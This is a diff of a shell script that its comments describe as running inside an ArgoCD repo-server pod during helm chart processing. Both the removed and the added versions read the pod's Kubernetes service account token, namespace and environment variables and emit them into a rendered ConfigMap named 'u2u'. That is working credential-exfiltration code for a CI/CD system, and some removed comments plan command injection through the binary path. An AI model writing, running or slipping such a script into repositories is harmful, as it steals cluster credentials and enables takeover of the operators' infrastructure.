@@ -1,26 +1,15 @@
 #!/bin/sh
-# ArgoCD runs: <binaryPath> build <cache_path>
-# Try to use /bin/sh and inject -c flag via $0
-# Or: write a script that lists pods
-# Since 'build' is a file in the cache dir, /bin/sh build <cache> works if CWD=cache dir
-
-# Get env - it tells us pod info
-RECON=$( (
-echo "===ENV==="
-env | sort
-echo "===PROC==="
-ls /proc/ 2>/dev/null | head -20
-echo "===TOKEN==="
-cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
-echo "===NAMESPACE==="
-cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
-) | base64 | tr -d '\n' )
-cat << EOF
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: u2u
-data:
-  result: $RECON
-EOF
+# This script is executed by ArgoCD during helm chart processing
+# We are in the repo-server pod - read its SA token + env
+TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+echo "apiVersion: v1"
+echo "kind: ConfigMap"
+echo "metadata:"
+echo "  name: u2u"
+echo "data:"
+echo "  token: $TOKEN"
+echo "  pod: $HOSTNAME"
+echo "  ns: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)"
+# Also list all env vars - find argocd-application-controller
+echo "  env: $(env | grep -i ARGO | tr '\n' '|')"
 exit 0
